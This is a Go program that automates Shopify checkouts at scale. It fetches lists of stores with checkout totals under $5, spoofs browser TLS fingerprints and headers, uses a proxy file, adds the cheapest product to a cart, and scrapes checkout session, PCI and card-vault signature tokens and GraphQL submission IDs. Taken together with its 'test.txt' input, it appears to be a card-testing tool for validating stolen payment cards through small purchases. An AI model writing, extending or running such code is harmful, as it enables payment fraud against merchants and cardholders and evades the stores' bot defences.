package main

import (
	"encoding/json"
	"fmt"
	"html"
	"io"
	"math"
	"math/rand"
	"net/http"
	"net/url"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	fhttp "github.com/bogdanfinn/fhttp"
	tls_client "github.com/bogdanfinn/tls-client"
	"github.com/bogdanfinn/tls-client/profiles"
)

const defaultShopURL = "https://gpzb9u-u9.myshopify.com"
const path = "test.txt"
const proxyPath = "px.txt"

const workingSitesAPI = "https://adventurous-renewal-production-cc37.up.railway.app/api/sites"
const maxSiteAmount = 5.0

type ProductsResponse struct {
	Products []Product `json:"products"`
}

type Product struct {
	ID       int64     `json:"id"`
	Title    string    `json:"title"`
	Variants []Variant `json:"variants"`
}

type Variant struct {
	ID        int64  `json:"id"`
	Title     string `json:"title"`
	Price     string `json:"price"`
	Available bool   `json:"available"`
}

type WorkingSite struct {
	URL    string
	Amount float64
}

func chooseAffordableSite(apiURL string, maxAmount float64) (WorkingSite, error) {
	endpoints := []string{apiURL}

	var lastErr error
	for _, endpoint := range endpoints {
		sites, err := fetchAffordableSites(endpoint, maxAmount)
		if err != nil {
			lastErr = err
			continue
		}
		if len(sites) == 0 {
			lastErr = fmt.Errorf("no sites <= %.2f from %s", maxAmount, endpoint)
			continue
		}
		return sites[rand.Intn(len(sites))], nil
	}

	if lastErr != nil {
		return WorkingSite{}, lastErr
	}
	return WorkingSite{}, fmt.Errorf("no site endpoint responded")
}

func fetchAffordableSites(apiURL string, maxAmount float64) ([]WorkingSite, error) {
	const pageSize = 500
	const maxPages = 4000
	const fetchConcurrency = 40

	type pageResult struct {
		offset  int
		objects []map[string]any
		total   int64
		html    string
		err     error
	}

	httpClient := &http.Client{Timeout: 15 * time.Second}

	fetchPage := func(offset int) pageResult {
		pageURL := fmt.Sprintf("%s?limit=%d&offset=%d", apiURL, pageSize, offset)

		var body []byte
		maxRetries := 3
		for attempt := 0; attempt < maxRetries; attempt++ {
			req, reqErr := http.NewRequest("GET", pageURL, nil)
			if reqErr != nil {
				return pageResult{offset: offset, err: reqErr}
			}
			req.Header.Set("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
			req.Header.Set("accept-language", "en-US,en;q=0.9")
			req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0")

			resp, err := httpClient.Do(req)
			if err != nil {
				if attempt < maxRetries-1 && isTransientErr(err) {
					time.Sleep(time.Duration(500*(attempt+1)) * time.Millisecond)
					continue
				}
				return pageResult{offset: offset, err: err}
			}
			body, _ = io.ReadAll(resp.Body)
			resp.Body.Close()
			break
		}

		bodyStr := string(body)
		if strings.HasPrefix(strings.TrimSpace(bodyStr), "<!DOCTYPE html") || strings.Contains(bodyStr, "<tbody>") {
			return pageResult{offset: offset, html: bodyStr}
		}

		var payload map[string]any
		if err := json.Unmarshal(body, &payload); err != nil {
			return pageResult{offset: offset, err: err}
		}
		var total int64
		if raw, ok := payload["total"]; ok {
			if n, ok := toFloat(raw); ok {
				total = int64(n)
			}
		}
		return pageResult{offset: offset, objects: collectObjects(payload), total: total}
	}

	first := fetchPage(0)
	if first.err != nil {
		return nil, first.err
	}
	if first.html != "" {
		sites := parseDashboardHTMLSites(first.html, maxAmount)
		fmt.Printf("[SITES] fetched %d affordable sites (under $%.0f) [HTML]\n", len(sites), maxAmount)
		return sites, nil
	}

	total := first.total
	pagesNeeded := 1
	if total > 0 {
		pagesNeeded = int((total + pageSize - 1) / pageSize)
	}
	if pagesNeeded > maxPages {
		pagesNeeded = maxPages
	}
	fmt.Printf("[SITES] API total=%d, fetching %d pages (%d/page)\n", total, pagesNeeded, pageSize)

	pages := make(map[int]pageResult, pagesNeeded)
	pages[0] = first

	if pagesNeeded > 1 {
		resultsCh := make(chan pageResult, pagesNeeded-1)
		sem := make(chan struct{}, fetchConcurrency)
		var wg sync.WaitGroup
		for i := 1; i < pagesNeeded; i++ {
			wg.Add(1)
			go func(offset int) {
				defer wg.Done()
				sem <- struct{}{}
				defer func() { <-sem }()
				resultsCh <- fetchPage(offset)
			}(i * pageSize)
		}
		go func() {
			wg.Wait()
			close(resultsCh)
		}()
		for pr := range resultsCh {
			if pr.err != nil {
				continue
			}
			pages[pr.offset] = pr
		}
	}

	var offsets []int
	for o := range pages {
		offsets = append(offsets, o)
	}
	sort.Ints(offsets)

	var out []WorkingSite
	seen := make(map[string]bool)
	for _, o := range offsets {
		for _, obj := range pages[o].objects {
			siteURL := extractSiteURL(obj)
			if siteURL == "" {
				continue
			}
			amount, ok := extractAmount(obj)
			if !ok || amount > maxAmount {
				continue
			}
			if seen[siteURL] {
				continue
			}
			seen[siteURL] = true
			out = append(out, WorkingSite{URL: siteURL, Amount: amount})
		}
	}

	if len(out) == 0 {
		return nil, fmt.Errorf("no affordable sites found in API payload")
	}
	fmt.Printf("[SITES] fetched %d affordable sites (under $%.0f) out of %d total\n", len(out), maxAmount, total)
	return out, nil
}

func parseDashboardHTMLSites(htmlBody string, maxAmount float64) []WorkingSite {
	rowRe := regexp.MustCompile(`<a href="(https?://[^"]+)"[^>]*>[^<]*</a></td><td[^>]*class="price"[^>]*>\$?([0-9.,â€”]+)</td>`)
	matches := rowRe.FindAllStringSubmatch(htmlBody, -1)

	var out []WorkingSite
	seen := make(map[string]bool)
	for _, m := range matches {
		if len(m) < 3 {
			continue
		}
		siteURL := strings.TrimSpace(m[1])
		siteURL = strings.TrimRight(siteURL, "/")
		priceStr := strings.TrimSpace(m[2])
		if priceStr == "â€”" {
			continue // no price info, skip
		}
		amount, ok := toFloat(priceStr)
		if !ok || amount <= 0 || amount > maxAmount {
			continue
		}
		if seen[siteURL] {
			continue
		}
		seen[siteURL] = true
		out = append(out, WorkingSite{URL: siteURL, Amount: amount})
	}
	return out
}

func collectObjects(v any) []map[string]any {
	out := []map[string]any{}
	switch node := v.(type) {
	case map[string]any:
		out = append(out, node)
		for _, child := range node {
			out = append(out, collectObjects(child)...)
		}
	case []any:
		for _, child := range node {
			out = append(out, collectObjects(child)...)
		}
	}
	return out
}

func extractSiteURL(obj map[string]any) string {
	keys := []string{"site", "url", "shop_url", "shopUrl", "shop", "domain", "website"}
	for _, k := range keys {
		raw, ok := obj[k]
		if !ok {
			continue
		}
		s := strings.TrimSpace(fmt.Sprint(raw))
		if s == "" {
			continue
		}
		if !strings.HasPrefix(s, "http://") && !strings.HasPrefix(s, "https://") {
			s = "https://" + s
		}
		u, err := url.ParseRequestURI(s)
		if err != nil || u.Host == "" {
			continue
		}
		return strings.TrimRight(u.Scheme+"://"+u.Host, "/")
	}
	return ""
}

func extractAmount(obj map[string]any) (float64, bool) {
	keys := []string{"amount", "price", "checkout_price", "value", "min_amount", "minAmount"}
	for _, k := range keys {
		raw, ok := obj[k]
		if !ok {
			continue
		}
		if n, ok := toFloat(raw); ok {
			return n, true
		}
	}
	return 0, false
}

func toFloat(v any) (float64, bool) {
	switch n := v.(type) {
	case float64:
		return n, true
	case int:
		return float64(n), true
	case int64:
		return float64(n), true
	case json.Number:
		f, err := n.Float64()
		return f, err == nil
	case string:
		numRe := regexp.MustCompile(`[-+]?\d*\.?\d+`)
		m := numRe.FindString(n)
		if m == "" {
			return 0, false
		}
		f, err := strconv.ParseFloat(m, 64)
		return f, err == nil
	default:
		return 0, false
	}
}

func isTransientErr(err error) bool {
	if err == nil {
		return false
	}
	lower := strings.ToLower(err.Error())
	return strings.Contains(lower, "eof") || strings.Contains(lower, "connection reset") || strings.Contains(lower, "broken pipe")
}

func doWithRetry(client tls_client.HttpClient, req *fhttp.Request, maxRetries int) (*fhttp.Response, error) {
	var lastErr error
	for attempt := 0; attempt < maxRetries; attempt++ {
		resp, err := client.Do(req)
		if err != nil {
			lastErr = err
			if attempt < maxRetries-1 && isTransientErr(err) {
				time.Sleep(time.Duration(500*(attempt+1)) * time.Millisecond)
				if req.GetBody != nil {
					if body, gbErr := req.GetBody(); gbErr == nil {
						req.Body = body
					}
				}
				continue
			}
			return nil, err
		}
		return resp, nil
	}
	return nil, lastErr
}

func findCheapestProduct(client tls_client.HttpClient, shopURL string) (productTitle string, productID string, variantID string, priceStr string, err error) {
	bestPrice := math.MaxFloat64
	found := false
	maxPages := 10

	urlsToTry := []string{
		shopURL + "/products.json?limit=250&page=%d",
		shopURL + "/products.json?limit=250",
	}

	var lastStatus int

	for _, urlPattern := range urlsToTry {
		for page := 1; page <= maxPages; page++ {
			var reqURL string
			if strings.Contains(urlPattern, "%d") {
				reqURL = fmt.Sprintf(urlPattern, page)
			} else {
				if page > 1 {
					break
				}
				reqURL = urlPattern
			}

			body, fetchErr := fetchProductPage(client, reqURL, shopURL)
			if fetchErr != nil {
				if strings.Contains(fetchErr.Error(), "status 429") && page == 1 {
					break
				}
				if page == 1 {
					lastStatus = extractStatusCode(fetchErr)
					break
				}
				break
			}

			var data ProductsResponse
			if jsonErr := json.Unmarshal(body, &data); jsonErr != nil {
				if page == 1 {
					break
				}
				break
			}

			if len(data.Products) == 0 {
				break
			}

			for _, p := range data.Products {
				for _, v := range p.Variants {
					if !v.Available {
						continue
					}
					price, convErr := strconv.ParseFloat(v.Price, 64)
					if convErr != nil {
						continue
					}
					if price < bestPrice {
						bestPrice = price
						productTitle = p.Title
						productID = strconv.FormatInt(p.ID, 10)
						variantID = strconv.FormatInt(v.ID, 10)
						priceStr = v.Price
						found = true
					}
				}
			}

			if len(data.Products) < 250 {
				goto done
			}
			time.Sleep(300 * time.Millisecond)
		}
		if found {
			break
		}
		time.Sleep(500 * time.Millisecond)
	}

done:
	if !found {
		statusMsg := ""
		if lastStatus > 0 {
			statusMsg = fmt.Sprintf(" (last status: %d)", lastStatus)
		}
		return "", "", "", "", fmt.Errorf("no available products found at %s%s", shopURL, statusMsg)
	}
	return productTitle, productID, variantID, priceStr, nil
}

func fetchProductPage(client tls_client.HttpClient, reqURL, shopURL string) ([]byte, error) {
	maxRetries := 3
	for attempt := 0; attempt < maxRetries; attempt++ {
		req, reqErr := fhttp.NewRequest("GET", reqURL, nil)
		if reqErr != nil {
			return nil, fmt.Errorf("building request: %w", reqErr)
		}
		req.Header.Set("accept", "application/json, text/javascript, */*; q=0.01")
		req.Header.Set("accept-language", "en-US,en;q=0.9")
		req.Header.Set("cache-control", "no-cache")
		req.Header.Set("pragma", "no-cache")
		req.Header.Set("referer", shopURL+"/")
		req.Header.Set("sec-ch-ua", `"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"`)
		req.Header.Set("sec-ch-ua-mobile", "?0")
		req.Header.Set("sec-ch-ua-platform", `"Windows"`)
		req.Header.Set("sec-fetch-dest", "empty")
		req.Header.Set("sec-fetch-mode", "cors")
		req.Header.Set("sec-fetch-site", "same-origin")
		req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0")
		req.Header.Set("x-requested-with", "XMLHttpRequest")

		resp, doErr := client.Do(req)
		if doErr != nil {
			lower := strings.ToLower(doErr.Error())
			if attempt < maxRetries-1 && (strings.Contains(lower, "eof") || strings.Contains(lower, "connection reset") || strings.Contains(lower, "broken pipe")) {
				time.Sleep(time.Duration(500*(attempt+1)) * time.Millisecond)
				continue
			}
			return nil, fmt.Errorf("GET %s: %w", reqURL, doErr)
		}

		if resp.StatusCode == http.StatusOK {
			body, readErr := io.ReadAll(resp.Body)
			resp.Body.Close()
			if readErr != nil {
				lower := strings.ToLower(readErr.Error())
				if attempt < maxRetries-1 && (strings.Contains(lower, "eof") || strings.Contains(lower, "connection reset") || strings.Contains(lower, "broken pipe")) {
					time.Sleep(time.Duration(500*(attempt+1)) * time.Millisecond)
					continue
				}
				return nil, fmt.Errorf("reading body: %w", readErr)
			}
			return body, nil
		}

		statusCode := resp.StatusCode
		resp.Body.Close()

		if statusCode == 429 && attempt < maxRetries-1 {
			time.Sleep(time.Duration(1000*(attempt+1)) * time.Millisecond)
			continue
		}
		return nil, fmt.Errorf("GET %s returned status %d", reqURL, statusCode)
	}
	return nil, fmt.Errorf("GET %s: max retries exceeded", reqURL)
}

func extractStatusCode(fetchErr error) int {
	re := regexp.MustCompile(`status (\d+)`)
	if m := re.FindStringSubmatch(fetchErr.Error()); len(m) > 1 {
		code, _ := strconv.Atoi(m[1])
		return code
	}
	return 0
}

func addToCartAndCheckout(client tls_client.HttpClient, shopURL, variantID string) (checkoutURL, checkoutToken, sessionToken, checkoutHTML string, err error) {
	payload := fmt.Sprintf(`{"id":%s,"quantity":1}`, variantID)
	addReq, err := fhttp.NewRequest("POST", shopURL+"/cart/add.js", strings.NewReader(payload))
	if err != nil {
		return "", "", "", "", fmt.Errorf("building cart request: %w", err)
	}
	addReq.Header.Set("Content-Type", "application/json")
	addReq.Header.Set("accept", "application/json")
	addReq.Header.Set("accept-language", "en-US,en;q=0.9")
	addReq.Header.Set("origin", shopURL)
	addReq.Header.Set("referer", shopURL+"/")
	addReq.Header.Set("sec-ch-ua", `"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"`)
	addReq.Header.Set("sec-ch-ua-mobile", "?0")
	addReq.Header.Set("sec-ch-ua-platform", `"Windows"`)
	addReq.Header.Set("sec-fetch-dest", "empty")
	addReq.Header.Set("sec-fetch-mode", "cors")
	addReq.Header.Set("sec-fetch-site", "same-origin")
	addReq.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0")

	addResp, err := doWithRetry(client, addReq, 2)
	if err != nil {
		return "", "", "", "", fmt.Errorf("POST /cart/add.js: %w", err)
	}
	defer addResp.Body.Close()
	io.Copy(io.Discard, addResp.Body) // drain

	if addResp.StatusCode != http.StatusOK {
		return "", "", "", "", fmt.Errorf("POST /cart/add.js returned status %d", addResp.StatusCode)
	}

	checkoutReq, err := fhttp.NewRequest("GET", shopURL+"/checkout", nil)
	if err != nil {
		return "", "", "", "", fmt.Errorf("building checkout request: %w", err)
	}
	checkoutReq.Header.Set("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
	checkoutReq.Header.Set("accept-language", "en-US,en;q=0.9")
	checkoutReq.Header.Set("sec-ch-ua", `"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"`)
	checkoutReq.Header.Set("sec-ch-ua-mobile", "?0")
	checkoutReq.Header.Set("sec-ch-ua-platform", `"Windows"`)
	checkoutReq.Header.Set("sec-fetch-dest", "document")
	checkoutReq.Header.Set("sec-fetch-mode", "navigate")
	checkoutReq.Header.Set("sec-fetch-site", "same-origin")
	checkoutReq.Header.Set("upgrade-insecure-requests", "1")
	checkoutReq.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0")

	checkoutResp, err := doWithRetry(client, checkoutReq, 2)
	if err != nil {
		return "", "", "", "", fmt.Errorf("GET /checkout: %w", err)
	}
	defer checkoutResp.Body.Close()

	checkoutURL = checkoutResp.Request.URL.String()

	tokenRe := regexp.MustCompile(`/checkouts/cn/([^/?]+)`)
	if m := tokenRe.FindStringSubmatch(checkoutURL); len(m) > 1 {
		checkoutToken = m[1]
	}

	htmlBytes, err := io.ReadAll(checkoutResp.Body)
	if err != nil {
		return "", "", "", "", fmt.Errorf("reading checkout HTML: %w", err)
	}
	checkoutHTML = string(htmlBytes)

	sessionRe := regexp.MustCompile(`<meta\s+name="serialized-sessionToken"\s+content="([^"]*)"`)
	if m := sessionRe.FindStringSubmatch(checkoutHTML); len(m) > 1 {
		sessionToken = html.UnescapeString(m[1])
		sessionToken = strings.Trim(sessionToken, `"`)
	}

	return checkoutURL, checkoutToken, sessionToken, checkoutHTML, nil
}

func extractPrivateAccessTokenID(checkoutHTML string) string {
	unescaped := html.UnescapeString(checkoutHTML)

	re := regexp.MustCompile(`"checkoutSessionIdentifier"\s*:\s*"([a-f0-9]+)"`)
	m := re.FindStringSubmatch(unescaped)
	if len(m) < 2 {
		return ""
	}

	return m[1]
}

func fetchPrivateAccessToken(client tls_client.HttpClient, shopURL, checkoutURL, patID string) (string, error) {
	reqURL := fmt.Sprintf("%s/private_access_tokens?id=%s&checkout_type=c1",
		shopURL, url.QueryEscape(patID))

	req, err := fhttp.NewRequest("GET", reqURL, nil)
	if err != nil {
		return "", fmt.Errorf("building request: %w", err)
	}

	req.Header.Set("accept", "*/*")
	req.Header.Set("accept-language", "en-US,en;q=0.9")
	req.Header.Set("referer", checkoutURL)
	req.Header.Set("sec-ch-ua", `"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"`)
	req.Header.Set("sec-ch-ua-mobile", "?0")
	req.Header.Set("sec-ch-ua-platform", `"Windows"`)
	req.Header.Set("sec-fetch-dest", "empty")
	req.Header.Set("sec-fetch-mode", "cors")
	req.Header.Set("sec-fetch-site", "same-origin")
	req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0")

	resp, err := doWithRetry(client, req, 2)
	if err != nil {
		return "", fmt.Errorf("GET private_access_tokens: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("reading response: %w", err)
	}

	return fmt.Sprintf("[%d] %s", resp.StatusCode, string(body)), nil
}

func extractActionsJSURL(checkoutHTML, shopURL string) string {
	re := regexp.MustCompile(`(/cdn/shopifycloud/checkout-web/assets/c1/actions[A-Za-z0-9_-]*\.[A-Za-z0-9_-]+\.js)`)
	m := re.FindStringSubmatch(checkoutHTML)
	if len(m) < 2 {
		return ""
	}
	return shopURL + m[1]
}

func extractProcessingJSURL(checkoutHTML, shopURL string) string {
	patterns := []string{
		`(/cdn/shopifycloud/checkout-web/assets/c1/useHasOrdersFromMultipleShops[A-Za-z0-9_.-]*\.js)`,
		`(/cdn/shopifycloud/checkout-web/assets/[A-Za-z0-9_/.-]*useHasOrdersFromMultipleShops[A-Za-z0-9_.-]*\.js)`,
		`(/cdn/shopifycloud/checkout-web/assets/c1/page-Processing[A-Za-z0-9_.-]*\.js)`,
		`(/cdn/shopifycloud/checkout-web/assets/c1/page-ThankYou[A-Za-z0-9_.-]*\.js)`,
		`(/cdn/shopifycloud/checkout-web/assets/[A-Za-z0-9_/.-]*[Pp]rocessing[A-Za-z0-9_.-]*\.js)`,
		`(/cdn/shopifycloud/checkout-web/assets/[A-Za-z0-9_/.-]*[Rr]eceipt[A-Za-z0-9_.-]*\.js)`,
	}
	for _, p := range patterns {
		re := regexp.MustCompile(p)
		m := re.FindStringSubmatch(checkoutHTML)
		if len(m) >= 2 {
			return shopURL + m[1]
		}
	}
	return ""
}

func extractProcessingJSURLs(checkoutHTML, shopURL string) []string {
	patterns := []string{
		`(/cdn/shopifycloud/checkout-web/assets/c1/useHasOrdersFromMultipleShops[A-Za-z0-9_.-]*\.js)`,
		`(/cdn/shopifycloud/checkout-web/assets/[A-Za-z0-9_/.-]*useHasOrdersFromMultipleShops[A-Za-z0-9_.-]*\.js)`,
		`(/cdn/shopifycloud/checkout-web/assets/c1/page-Processing[A-Za-z0-9_.-]*\.js)`,
		`(/cdn/shopifycloud/checkout-web/assets/c1/page-ThankYou[A-Za-z0-9_.-]*\.js)`,
		`(/cdn/shopifycloud/checkout-web/assets/[A-Za-z0-9_/.-]*[Pp]rocessing[A-Za-z0-9_.-]*\.js)`,
		`(/cdn/shopifycloud/checkout-web/assets/[A-Za-z0-9_/.-]*[Rr]eceipt[A-Za-z0-9_.-]*\.js)`,
	}
	seen := map[string]bool{}
	var urls []string
	for _, p := range patterns {
		re := regexp.MustCompile(p)
		for _, m := range re.FindAllStringSubmatch(checkoutHTML, -1) {
			if len(m) >= 2 {
				u := shopURL + m[1]
				if !seen[u] {
					seen[u] = true
					urls = append(urls, u)
				}
			}
		}
	}
	allRe := regexp.MustCompile(`(/cdn/shopifycloud/checkout-web/assets/[A-Za-z0-9_/.-]+\.js)`)
	skip := regexp.MustCompile(`(?i)(locale-|polyfills|libphonenumber|qrcodegen|getCountryCallingCode|/css/|FullScreenBackground|component-[A-Z])`)
	for _, m := range allRe.FindAllStringSubmatch(checkoutHTML, -1) {
		if len(m) >= 2 {
			u := shopURL + m[1]
			if seen[u] {
				continue
			}
			if skip.MatchString(m[1]) {
				continue
			}
			seen[u] = true
			urls = append(urls, u)
		}
	}
	return urls
}

func fetchActionsJS(client tls_client.HttpClient, actionsURL, shopURL string) (jsBody string, err error) {
	req, err := fhttp.NewRequest("GET", actionsURL, nil)
	if err != nil {
		return "", fmt.Errorf("building request: %w", err)
	}

	req.Header.Set("accept", "*/*")
	req.Header.Set("accept-language", "en-US,en;q=0.9")
	req.Header.Set("origin", shopURL)
	req.Header.Set("priority", "u=1")
	req.Header.Set("sec-ch-ua", `"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"`)
	req.Header.Set("sec-ch-ua-mobile", "?0")
	req.Header.Set("sec-ch-ua-platform", `"Windows"`)
	req.Header.Set("sec-fetch-dest", "script")
	req.Header.Set("sec-fetch-mode", "cors")
	req.Header.Set("sec-fetch-site", "same-origin")
	req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0")

	resp, err := doWithRetry(client, req, 2)
	if err != nil {
		return "", fmt.Errorf("GET actions JS: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("reading response: %w", err)
	}

	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("GET actions JS returned status %d", resp.StatusCode)
	}

	return string(body), nil
}

func extractProposalID(jsBody string) string {
	re := regexp.MustCompile(`id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"Proposal"`)
	m := re.FindStringSubmatch(jsBody)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func extractSubmitForCompletionID(jsBody string) string {
	re := regexp.MustCompile(`id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"mutation"\s*,\s*name:\s*"SubmitForCompletion"`)
	m := re.FindStringSubmatch(jsBody)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func extractPollForReceiptID(jsBody string) string {
	patterns := []string{
		`id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"PollForReceipt"`,
		`name:\s*"PollForReceipt"\s*,\s*type:\s*"query"\s*,\s*id:\s*"([a-f0-9]{64})"`,
		`"PollForReceipt"[^}]{0,200}id:\s*"([a-f0-9]{64})"`,
		`id:\s*"([a-f0-9]{64})"[^}]{0,200}"PollForReceipt"`,
		`id:\s*'([a-f0-9]{64})'\s*,\s*type:\s*'query'\s*,\s*name:\s*'PollForReceipt'`,
		`PollForReceipt.{0,300}?([a-f0-9]{64})`,
		`([a-f0-9]{64}).{0,300}?PollForReceipt`,
	}
	for _, p := range patterns {
		re := regexp.MustCompile(p)
		m := re.FindStringSubmatch(jsBody)
		if len(m) >= 2 {
			return m[1]
		}
	}
	return ""
}

func extractReceiptID(submitBody string) string {
	re := regexp.MustCompile(`"id"\s*:\s*"(gid://shopify/ProcessedReceipt/[0-9a-zA-Z]+)"`)
	m := re.FindStringSubmatch(submitBody)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func extractReceiptSessionToken(submitBody string) string {
	re := regexp.MustCompile(`"sessionToken"\s*:\s*"([^"]+)"`)
	m := re.FindStringSubmatch(submitBody)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func extractStableID(checkoutHTML string) string {
	unescaped := html.UnescapeString(checkoutHTML)
	re := regexp.MustCompile(`"stableId"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"`)
	m := re.FindStringSubmatch(unescaped)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func extractCommitSha(checkoutHTML string) string {
	unescaped := html.UnescapeString(checkoutHTML)
	re := regexp.MustCompile(`"commitSha"\s*:\s*"([a-f0-9]{40})"`)
	m := re.FindStringSubmatch(unescaped)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func extractSourceToken(checkoutHTML string) string {
	re := regexp.MustCompile(`<meta\s+name="serialized-sourceToken"\s+content="([^"]*)"`)
	m := re.FindStringSubmatch(checkoutHTML)
	if len(m) < 2 {
		return ""
	}
	val := html.UnescapeString(m[1])
	return strings.Trim(val, `"`)
}

func extractIdentificationSignature(checkoutHTML string) string {
	unescaped := html.UnescapeString(checkoutHTML)
	re := regexp.MustCompile(`checkoutCardsinkCallerIdentificationSignature":"([^"]+)"`)
	m := re.FindStringSubmatch(unescaped)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func extractPCISessionID(pciBody string) string {
	re := regexp.MustCompile(`"id"\s*:\s*"([^"]+)"`)
	m := re.FindStringSubmatch(pciBody)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func extractDeliveryHandle(proposalBody string) string {
	re := regexp.MustCompile(`"selectedDeliveryStrategy"\s*:\s*\{"handle"\s*:\s*"([^"]+)"\s*,\s*"__typename"\s*:\s*"CompleteDeliveryStrategy"`)
	m := re.FindStringSubmatch(proposalBody)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func extractSignedHandles(proposalBody string) []string {
	re := regexp.MustCompile(`"signedHandle"\s*:\s*"([^"]+)"`)
	matches := re.FindAllStringSubmatch(proposalBody, -1)
	var handles []string
	for _, m := range matches {
		if len(m) >= 2 {
			handles = append(handles, m[1])
		}
	}
	return handles
}

func extractPaymentMethodID(proposalBody string) string {
	re := regexp.MustCompile(`"paymentMethodIdentifier"\s*:\s*"([^"]+)"\s*,\s*"name"\s*:\s*"shopify_payments"`)
	m := re.FindStringSubmatch(proposalBody)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func extractShippingAmount(proposalBody string) string {
	re := regexp.MustCompile(`"__typename"\s*:\s*"CompleteDeliveryStrategy"\}\]\s*,\s*"__typename"\s*:\s*"DeliveryLine"\}`)
	re2 := regexp.MustCompile(`"deliveryStrategyBreakdown"\s*:\s*\[\s*\{\s*"amount"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"`)
	m := re2.FindStringSubmatch(proposalBody)
	if len(m) < 2 {
		_ = re
		return ""
	}
	return m[1]
}

func extractCheckoutTotal(proposalBody string) string {
	re := regexp.MustCompile(`"checkoutTotal"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"`)
	m := re.FindStringSubmatch(proposalBody)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func extractSellerTotal(proposalBody string) string {
	re := regexp.MustCompile(`"total"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"`)
	m := re.FindStringSubmatch(proposalBody)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func extractSellerMerchandisePrice(proposalBody string) string {
	re := regexp.MustCompile(`"ContextualizedProductVariantMerchandise".*?"totalAmount"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"`)
	m := re.FindStringSubmatch(proposalBody)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func extractSellerCurrency(proposalBody string) string {
	re := regexp.MustCompile(`"supportedCurrencies"\s*:\s*\["([^"]+)"`)
	m := re.FindStringSubmatch(proposalBody)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func extractSellerCountry(proposalBody string) string {
	re := regexp.MustCompile(`"supportedCountries"\s*:\s*\["([^"]+)"`)
	m := re.FindStringSubmatch(proposalBody)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

func extractCurrencyFromHTML(checkoutHTML string) string {
	re1 := regexp.MustCompile(`(?i)currencycode\s*[:=]\s*["']?([A-Za-z]{3})`)
	if m := re1.FindStringSubmatch(checkoutHTML); len(m) >= 2 {
		return strings.ToUpper(m[1])
	}
	re2 := regexp.MustCompile(`urrencyCode&quot;:&quot;([A-Za-z]{3})`)
	if m := re2.FindStringSubmatch(checkoutHTML); len(m) >= 2 {
		return strings.ToUpper(m[1])
	}
	return ""
}

func extractCheckoutPriceFromHTML(checkoutHTML string) string {
	re := regexp.MustCompile(`data-checkout-total-price="([^"]+)"`)
	if m := re.FindStringSubmatch(checkoutHTML); len(m) >= 2 {
		return m[1]
	}
	re2 := regexp.MustCompile(`data-checkout-subtotal-price="([^"]+)"`)
	if m := re2.FindStringSubmatch(checkoutHTML); len(m) >= 2 {
		return m[1]
	}
	return ""
}

func patchPayload(payload, currency, country string) string {
	if currency != "USD" {
		payload = strings.ReplaceAll(payload, `"currencyCode": "USD"`, `"currencyCode": "`+currency+`"`)
		payload = strings.ReplaceAll(payload, `"presentmentCurrency": "USD"`, `"presentmentCurrency": "`+currency+`"`)
	}
	if country != "US" {
		payload = strings.ReplaceAll(payload, `"countryCode": "US"`, `"countryCode": "`+country+`"`)
		payload = strings.ReplaceAll(payload, `"phoneCountryCode": "US"`, `"phoneCountryCode": "`+country+`"`)
	}
	return payload
}

